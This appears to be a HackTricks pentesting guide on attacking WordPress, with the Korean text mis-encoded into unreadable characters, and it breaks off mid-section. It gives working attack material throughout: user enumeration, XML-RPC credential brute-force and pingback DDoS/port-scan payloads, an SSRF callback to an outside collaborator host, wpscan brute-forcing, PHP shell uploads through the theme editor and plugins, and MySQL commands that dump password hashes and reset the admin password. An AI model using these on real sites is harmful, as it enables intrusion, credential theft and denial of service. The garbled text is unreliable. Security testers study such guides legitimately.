# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ë”°ë¼ì„œ í…Œë§ˆì˜ phpë¥¼ ë³€ê²½í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ë©´ ì•„ë§ˆë„ í•´ë‹¹ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ê²Œ ë©ë‹ˆë‹¤. ì˜ˆ: **theme twentytwelve**ë¥¼ ì‚¬ìš©í•˜ë©´ [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)ì—ì„œ **404.php** íŒŒì¼ì— **access**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt`ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ê³¼ ê°™ì€ ìœ ìš©í•œ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆë¡œìš´ WordPress ì‚¬ì´íŠ¸ë¥¼ ì„¤ì •í•  ë•Œ ì´ë©”ì¼ í™œì„±í™” í”„ë¡œì„¸ìŠ¤ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë”(ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë³€ê²½ë  ìˆ˜ ìˆìŒ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ í•˜ì—¬ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” WordPress ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ í†µì‹ ì€ WordPressì˜ [REST API](https://developer.wordpress.org/rest-api/reference)ë¡œ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/`ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, í°íŠ¸, JavaScript íŒŒì¼ ë° ìœ„ì ¯ê³¼ ê°™ì€ í•µì‹¬ íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í† ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress ë²„ì „ 5.5 ì´ìƒì—ì„œëŠ” ê³µê°œëœ ëª¨ë“  ê²Œì‹œë¬¼ê³¼ ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì… ë° taxonomyë¥¼ í¬í•¨í•œ sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

**Post exploitation**

- `wp-config.php` íŒŒì¼ì—ëŠ” WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ì •ë³´(ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, database host, username ë° password, authentication keys ë° salts, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“±)ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì„± íŒŒì¼ì€ ë˜í•œ ë¬¸ì œ í•´ê²°ì— ìœ ìš©í•œ DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Users Permissions

- **Administrator**
- **Editor**: ìì‹ ì˜ ê¸€ê³¼ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ê¸€ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤
- **Author**: ìì‹ ì˜ ê¸€ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤
- **Contributor**: ê¸€ì„ ì‘ì„±í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë‚˜ ê²Œì‹œí•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤
- **Subscriber**: ê²Œì‹œë¬¼ì„ ì—´ëŒí•˜ê³  ìì‹ ì˜ í”„ë¡œí•„ì„ í¸ì§‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

## **Passive Enumeration**

### **Get WordPress version**

ë‹¤ìŒ íŒŒì¼(`/license.txt` ë˜ëŠ” `/readme.html`)ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”

í˜ì´ì§€ì˜ **source code** ì•ˆì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ìœ¼ë¡œ ë²„ì „ ì¶”ì¶œ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ëŠ¥ë™ì  ì—´ê±°

### Plugins and Themes

ì•„ë§ˆ ëª¨ë“  Plugins and Themesë¥¼ ì°¾ì§€ ëª»í•  ê²ƒì…ë‹ˆë‹¤. ëª¨ë‘ ë°œê²¬í•˜ë ¤ë©´ **actively Brute Force a list of Plugins and Themes** í•´ì•¼ í•©ë‹ˆë‹¤ (ë‹¤í–‰íˆ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ë“¤ì´ ì¡´ì¬í•©ë‹ˆë‹¤).

### ì‚¬ìš©ì

- **ID Brute:** WordPress ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì IDë¥¼ Brute Forcingí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´, í•´ë‹¹ idëŠ” **ìœ íš¨**ì…ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ idëŠ” **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì¿¼ë¦¬í•˜ì—¬ usersì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì–´ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ê³µê°œí•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` ì—”ë“œí¬ì¸íŠ¸ëŠ”:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ì´ ê¸°ëŠ¥ì„ í™œì„±í™”í•œ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤**.

ë˜í•œ **/wp-json/wp/v2/pages**ëŠ” IP ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **Login username enumeration**: ë¡œê·¸ì¸í•  ë•Œ **`/wp-login.php`**ì—ì„œ **ë©”ì‹œì§€**ê°€ **ë‹¤ë¥´ê²Œ** í‘œì‹œë˜ì–´ í•´ë‹¹ **ì‚¬ìš©ì ì´ë¦„ì´ ì¡´ì¬í•˜ëŠ”ì§€ ì—¬ë¶€**ë¥¼ ì•Œë ¤ì¤ë‹ˆë‹¤.

### XML-RPC

ë§Œì•½ `xml-rpc.php`ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ credentials brute-forceë¥¼ ìˆ˜í–‰í•˜ê±°ë‚˜ ë‹¤ë¥¸ ìì›ì— ëŒ€í•´ DoS ê³µê²©ì„ ì‹œì‘í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**ìê²© ì¦ëª… Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ë˜ëŠ” **`metaWeblog.getUsersBlogs`**ëŠ” ìê²© ì¦ëª…ì„ brute-forceí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ë“¤ ì¤‘ ì¼ë¶€ì…ë‹ˆë‹¤. ë§Œì•½ ì´ë“¤ ì¤‘ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
ìê²© ì¦ëª…ì´ ìœ íš¨í•˜ì§€ ì•Šì„ ê²½ìš°, 200 ì½”ë“œ ì‘ë‹µ ë‚´ì— _"Incorrect username or password"_ ë©”ì‹œì§€ê°€ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì— ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ **ë” ë¹ ë¥¸ ë°©ë²•**ì´ ìˆëŠ”ë°, ë™ì¼í•œ ìš”ì²­ì—ì„œ ì—¬ëŸ¬ ìê²©ì¦ëª…ì„ ì‹œë„í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— **`system.multicall`**ì„ ì‚¬ìš©í•´ ìê²©ì¦ëª…ì„ brute-forceí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA ìš°íšŒ**

ì´ ë©”ì„œë“œëŠ” ì‚¬ëŒìš©ì´ ì•„ë‹ˆë¼ í”„ë¡œê·¸ë¨ìš©ìœ¼ë¡œ ë§Œë“¤ì–´ì¡Œê³  ì˜¤ë˜ë˜ì–´ 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ credsë¥¼ ê°€ì§€ê³  ìˆì§€ë§Œ ë©”ì¸ ì§„ì…ì´ 2FAë¡œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´, **xmlrpc.phpë¥¼ ì•…ìš©í•´ í•´ë‹¹ credsë¡œ 2FAë¥¼ ìš°íšŒí•˜ì—¬ ë¡œê·¸ì¸í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**. ì½˜ì†”ì„ í†µí•´ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•˜ë“¯ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**DDoS ë˜ëŠ” í¬íŠ¸ ìŠ¤ìºë‹**

ëª©ë¡ ì•ˆì—ì„œ _**pingback.ping**_ ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ Wordpressê°€ ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸/í¬íŠ¸ë¡œ ìš”ì²­ì„ ë³´ë‚´ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì€ ìˆ˜ì²œ ê°œì˜ Wordpress **sites**ì— í•˜ë‚˜ì˜ **location**ì— **access**í•˜ë„ë¡ ìš”ì²­í•´ ê·¸ ìœ„ì¹˜ì—ì„œ **DDoS**ë¥¼ ìœ ë°œí•˜ê²Œ í•˜ê±°ë‚˜, Wordpressë¥¼ ì´ìš©í•´ ë‚´ë¶€ **network**ë¥¼ **scan**í•˜ë„ë¡ ë§Œë“¤ ë•Œ(ì„ì˜ì˜ í¬íŠ¸ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤) ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** ê°’ì´ **0**(17)ë³´ë‹¤ **í°** ê²½ìš°, í¬íŠ¸ê°€ ì—´ë ¤ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ì´ì „ ì„¹ì…˜ì—ì„œ **`system.multicall`**ì˜ ì‚¬ìš©ì„ ì‚´í´ë³´ë©´ ì´ ë©”ì„œë“œë¥¼ ì•…ìš©í•´ DDoSë¥¼ ìœ ë°œí•˜ëŠ” ë°©ë²•ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
ì´ íŒŒì¼ì— **ì ‘ê·¼**í•˜ë©´ **ë¬´ê±°ìš´** MySQL **ì¿¼ë¦¬**ê°€ ì‹¤í–‰ë˜ì–´, **ê³µê²©ì**ê°€ ì´ë¥¼ ì´ìš©í•´ **DoS**ë¥¼ **ìœ ë°œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ê¸°ë³¸ì ìœ¼ë¡œ, `wp-cron.php`ëŠ” ëª¨ë“  í˜ì´ì§€ ë¡œë“œ(í´ë¼ì´ì–¸íŠ¸ê°€ Wordpressì˜ ì–´ë–¤ í˜ì´ì§€ë“  ìš”ì²­í•  ë•Œë§ˆë‹¤) ì‹œ í˜¸ì¶œë˜ë¯€ë¡œ, íŠ¸ë˜í”½ì´ ë§ì€ ì‚¬ì´íŠ¸ì—ì„œëŠ” ë¬¸ì œê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (DoS).

Wp-Cronì„ ë¹„í™œì„±í™”í•˜ê³  í˜¸ìŠ¤íŠ¸ ë‚´ë¶€ì—ì„œ ì‹¤ì œ cronjobì„ ë§Œë“¤ì–´ í•„ìš”í•œ ì‘ì—…ì„ ì •ê¸°ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì„ ê¶Œì¥í•©ë‹ˆë‹¤(ë¬¸ì œë¥¼ ì¼ìœ¼í‚¤ì§€ ì•Šë„ë¡).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ì´ ë„êµ¬ëŠ” **methodName: pingback.ping**ì´ ìˆëŠ”ì§€ì™€ ê²½ë¡œ **/wp-json/oembed/1.0/proxy**ê°€ ì¡´ì¬í•˜ëŠ”ì§€ë¥¼ í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ë©´ ì´ë¥¼ ì•…ìš©í•˜ë ¤ ì‹œë„í•©ë‹ˆë‹¤.

## ìë™ ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ë¹„íŠ¸ í•˜ë‚˜ë¥¼ ë®ì–´ì¨ì„œ ì ‘ê·¼ ì–»ê¸°

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ëŠ” í˜¸ê¸°ì‹¬ì— ê°€ê¹ìŠµë‹ˆë‹¤. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œëŠ” wordpress íŒŒì¼ì˜ ì„ì˜ ìœ„ì¹˜ì—ì„œ 1 ë¹„íŠ¸ë¥¼ ë°˜ì „ì‹œí‚¬ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389`ì˜ ë¹„íŠ¸ë¥¼ ë°˜ì „ì‹œì¼œ NOT (`!`) ì—°ì‚°ì„ NOPë¡œ ë§Œë“¤ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ì‚¬ìš© ì¤‘ì¸ í…Œë§ˆì˜ php ìˆ˜ì • (ê´€ë¦¬ì ìê²© ì¦ëª… í•„ìš”)**

Appearance â†’ Theme Editor â†’ 404 Template (at the right)

php shellì„ ìœ„í•´ ë‚´ìš©ì„ ë³€ê²½:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ê²€ìƒ‰í•˜ì„¸ìš”. ì´ ê²½ìš° ë‹¤ìŒì— ì ‘ê·¼í•˜ë©´ ë©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ë‹¤ìŒê³¼ ê°™ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

The content includes visual aids depicting the steps in the WordPress dashboard for installing and activating the plugin. However, it's important to note that exploiting vulnerabilities in this manner is illegal and unethical without proper authorization. This information should be used responsibly and only in a legal context, such as penetration testing with explicit permission.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### ê³µê²© í‘œë©´

Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ì™¸ë¶€ì— ë…¸ì¶œí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ í•´ë‹¹ ê¸°ëŠ¥ì˜ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° í•µì‹¬ì…ë‹ˆë‹¤. í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ” ë°©ë²•ì€ ë‹¤ìŒ í•­ëª©ë“¤ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ì˜ˆì‹œëŠ” [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ì— ìˆìŠµë‹ˆë‹¤.

- **`wp_ajax`**

í”ŒëŸ¬ê·¸ì¸ì´ ì‚¬ìš©ìì—ê²Œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX handlersë¥¼ í†µí•´ì„œì…ë‹ˆë‹¤. ì´ë“¤ì€ ë¡œì§, authorization ë˜ëŠ” authentication ë²„ê·¸ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì´ authenticationê³¼ authorizationì„ Wordpress nonceì˜ ì¡´ì¬ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ ê½¤ ìì£¼ ìˆìœ¼ë©°, ê·¸ nonceëŠ” **Wordpress ì¸ìŠ¤í„´ìŠ¤ì— ì¸ì¦ëœ ëª¨ë“  ì‚¬ìš©ì(ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ)**ê°€ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ì˜ ì‚¬ìš©ì€ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼ ê°€ëŠ¥í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.**

> [!CAUTION]
> ê²Œë‹¤ê°€, ë§Œì•½ í•¨ìˆ˜ê°€ ë‹¨ì§€ `wp_verify_nonce` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•˜ëŠ” ê²ƒì´ë¼ë©´, ì´ í•¨ìˆ˜ëŠ” ë‹¨ì§€ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í–ˆëŠ”ì§€ ì—¬ë¶€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ìì˜ ì—­í• ì€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ ê¶Œí•œì´ ë†’ì€ ì‘ì—…ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ wordpressì—ì„œ rest APë¥¼ ë“±ë¡í•˜ì—¬ í•¨ìˆ˜ë¥¼ ë…¸ì¶œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **php íŒŒì¼ì— ëŒ€í•œ ì§ì ‘ ì ‘ê·¼**

